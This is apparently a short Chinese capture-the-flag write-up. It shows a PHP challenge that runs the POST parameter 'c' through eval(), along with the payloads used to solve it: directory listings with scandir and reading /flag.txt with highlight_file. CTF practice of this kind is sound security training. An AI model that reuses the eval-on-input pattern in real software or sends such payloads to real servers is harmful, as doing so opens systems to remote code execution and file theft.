```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```



```
c=var_dump(scandir(getcwd()));
```

![image-20250404161728015](./assets/image-20250404161728015.png)

```
c=var_dump(scandir("/"));
```

![image-20250404161754267](./assets/image-20250404161754267.png)

依旧是根目录中存在flag.txt





读取

```
c=highlight_file("/flag.txt");
```

![image-20250404161833672](./assets/image-20250404161833672.png)